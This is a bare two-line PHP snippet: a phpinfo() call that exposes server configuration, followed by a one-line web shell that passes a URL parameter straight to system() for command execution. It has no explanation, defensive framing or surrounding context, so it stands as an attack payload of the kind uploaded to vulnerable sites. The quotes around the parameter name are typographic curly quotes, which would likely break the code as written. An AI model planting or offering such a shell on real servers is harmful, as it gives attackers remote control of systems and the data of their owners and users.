 <?php phpinfo();?>
 <?php system($_GET[‘cmd’]);?>
